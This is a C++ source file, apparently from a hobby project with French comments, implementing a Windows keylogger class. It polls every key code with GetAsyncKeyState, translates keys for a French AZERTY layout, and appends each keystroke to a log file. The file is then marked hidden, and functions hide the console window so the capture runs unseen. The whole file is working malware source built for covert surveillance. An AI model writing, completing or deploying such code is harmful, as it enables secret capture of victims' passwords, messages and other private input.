#include "Keylogger.hpp"
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <typeinfo>
#include<sstream>

Keylogger::Keylogger()
{
	filename = "records.txt";
}

Keylogger::Keylogger(string fileName)
{
	filename = fileName;
}

int Keylogger::writeIntoFile(string words) {
	ofstream fichier;
	fichier.open(filename, ios::app);
	fichier << words;
	fichier.close();
	setHiddenFile();
	return 0;
}




void Keylogger::listenKeyboard() {
	// Si on a une touche pressée
	short key;
	string words;
	
	
	/* Manage CAPS LOCK */
	if (isCapsLock() && capsOn == 1) {

		writeIntoFile("[CAPS LOCK ON]");
		capsOnBool = true;
	}
	if (capsOff == 1) {
		writeIntoFile("[CAPS LOCK OFF]");
		capsOnBool = false;
	}

	
		
	/* A-Z */
	for (key = 0; key <= 255; key++) {
		if (GetAsyncKeyState(key) == -32767) {
			
			
			/* MAJUSCULE */
			if (GetAsyncKeyState(VK_SHIFT) && key >= 64 && key <= 91) {
				string words(1,(char (key)));
			}
			
			/* MINUSCULE */ 
			else if(key >= 64 && key <= 91) {
				// 32 est l'offset de difference entre les majuscules et minuscules dans le code ASCII
				string words(1,((char(key + 32))));
				writeIntoFile(words);
			}

			/* SHIFT + NUMERO clavier FR */
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x30) {
				writeIntoFile( "0");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x31) {
				writeIntoFile( "1");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x32) {
				writeIntoFile("2");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x33) {
				writeIntoFile("3");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x34) {
				writeIntoFile("4");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x35) {
				writeIntoFile("5");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x36) {
				writeIntoFile("6");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x37) {
				writeIntoFile("7");
			}
			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x38) {
				writeIntoFile("8");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == 0x39) {
				writeIntoFile("9");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_102) {
				writeIntoFile(">");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_COMMA) {
				writeIntoFile("?");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_PERIOD) {
				writeIntoFile(".");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_2) {
				writeIntoFile("/");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_8) {
				writeIntoFile("§");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_6) {
				writeIntoFile("¨");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_3) {
				writeIntoFile("%");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_1) {
				writeIntoFile("£");
			}

			else if (GetAsyncKeyState(VK_SHIFT) && key == VK_OEM_5) {
				writeIntoFile("µ");
			}

			else if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU) && key == 0x030) {
				writeIntoFile("@");
			}

		


			/* SANS SHIFT */
			
			else if ( key == 0x30) {
				writeIntoFile( "à");
			}
			else if (key == 0x31) {
				writeIntoFile("&");
			}
			else if (key == 0x32) {
				writeIntoFile("é");
			}
			else if (key == 0x33) {
				writeIntoFile("\"");
			}
			else if (key == 0x34) {
				writeIntoFile("'");
			}
			else if (key == 0x35) {
				writeIntoFile("(");
			}
			else if (key == 0x36) {
				writeIntoFile("-");
			}
			else if (key == 0x37) {
				writeIntoFile("è");
			}
			else if (key == 0x38) {
				writeIntoFile("_");
			}

			else if (key == 0x39) {
				writeIntoFile("ç");
			}

			/*
			else if (key == 0x3A - 40) {
				cout << "[ALT]";
			}
			*/



			else {
				/* CARACTERE SPECIAUX */
				switch (key) {
					

					/* PAD NUMERIQUE */
					case VK_NUMPAD0:
						writeIntoFile("0");
						break;

					case VK_NUMPAD1:
						writeIntoFile("1");
						break;
					case VK_NUMPAD2:
						writeIntoFile("2");
						break;
					case VK_NUMPAD3:
						writeIntoFile("3");
						break;
					case VK_NUMPAD4:
						writeIntoFile("4");
						break;
					case VK_NUMPAD5:
						writeIntoFile("5");
						break;
					case VK_NUMPAD6:
						writeIntoFile("6");
						break;
					case VK_NUMPAD7:
						writeIntoFile("7");
						break;
					case VK_NUMPAD8:
						writeIntoFile("8");
						break;
					case VK_NUMPAD9:
						writeIntoFile("9");
						break;

					/* CARACTERE NON HABITUELS */
					case VK_TAB:
						writeIntoFile("[TAB]");
						break;
					case VK_BACK:
						writeIntoFile("[<- BACKSPACE]");
						break;
					case VK_RETURN:
						writeIntoFile("[ENTER]");
						break;
					case VK_SPACE:
						writeIntoFile(" ");
						break;

					case VK_ESCAPE:
						writeIntoFile("[ECHAP]");
						break;

					case VK_LEFT:
						writeIntoFile("[LEFT]");
						break;

					case VK_RIGHT:
						writeIntoFile("[RIGHT]");
						break;
					case VK_UP:
						writeIntoFile("[UP]");
						break;
					case VK_DOWN:
						writeIntoFile("[DOWN]");
						break;

					/*
					case VK_CONTROL:
						cout << "[CTRL]";
						break;

					*/
					case VK_DELETE:
						writeIntoFile("[DELETE]");
						break;

					


					/* OPERATEUR */

					case VK_MULTIPLY:
						writeIntoFile("*");
						break;
					case VK_ADD:
						writeIntoFile("+");
						break;

					case VK_DIVIDE:
						writeIntoFile("/");
						break;
					
					case VK_SUBTRACT:
						writeIntoFile("-");
						break;

					/* F1 TO F12 */
					
					case VK_F1:
						writeIntoFile("[F1]");
						break;

					case VK_F2:
						writeIntoFile("[F2]");
						break;
					case VK_F3:
						writeIntoFile("[F3]");
						break;
					case VK_F4:
						writeIntoFile("[F4]");
						break;
					case VK_F5:
						writeIntoFile("[F5]");
						break;
					case VK_F6:
						writeIntoFile("[F6]");
						break;
					case VK_F7:
						writeIntoFile("[F7]");
						break;
					case VK_F8:
						writeIntoFile("[F8]");
						break;
					case VK_F9:
						writeIntoFile("[F9]");
						break;
					case VK_F10:
						writeIntoFile("[F10]");
						break;
					case VK_F11:
						writeIntoFile("[F11]");
						break;
					case VK_F12:
						writeIntoFile("[F12]");
						break;

					/* TOUCHE INHABITUELLES */
					case VK_OEM_PLUS:
						writeIntoFile("=");
						break;

					case VK_OEM_COMMA:
						writeIntoFile(",");
						break;

					case VK_OEM_MINUS:
						writeIntoFile("-");
						break;

					case VK_OEM_PERIOD:
						writeIntoFile(";");
						break;
					
					case VK_OEM_1:
						writeIntoFile("$");
						break;
					case VK_OEM_2:
						writeIntoFile(":");
						break;
					case VK_OEM_3:
						writeIntoFile("ù");
						break;
					case VK_OEM_4:
						writeIntoFile(")");
						break;
					case VK_OEM_5:
						writeIntoFile("*");
						break;
					case VK_OEM_6:
						writeIntoFile("^");
						break;

					case VK_OEM_7:
						writeIntoFile("²");
						break;
					case VK_OEM_8:
						writeIntoFile("!");
						break;
					case VK_OEM_102:
						writeIntoFile("<");
						break;
						
					default:
						break;

				}
			}
			
			//cout << typeid(key).name();
			
		}

	}


	


	/* SPECIAL CHARACTER */


	

}



int Keylogger::setHiddenFile()
{
	std::wstring temp = std::wstring(filename.begin(), filename.end());
	LPCWSTR sw = temp.c_str();
	DWORD attributes = GetFileAttributes(sw);
	if ((attributes & FILE_ATTRIBUTE_HIDDEN) == 0) {
		SetFileAttributes(sw, attributes | FILE_ATTRIBUTE_HIDDEN);
	}
	return 0;
}

bool Keylogger::isCapsLock()
{	
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
		capsOn += 1;
		capsOff = 0;
		return true;
	}
	else {
		capsOff += 1;
		capsOn = 0;
		return false;
	}
}

int Keylogger::hideConsole()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	return 0;
}

int Keylogger::showConsole()
{

	ShowWindow(GetConsoleWindow(), SW_SHOW);
	return 0;
}
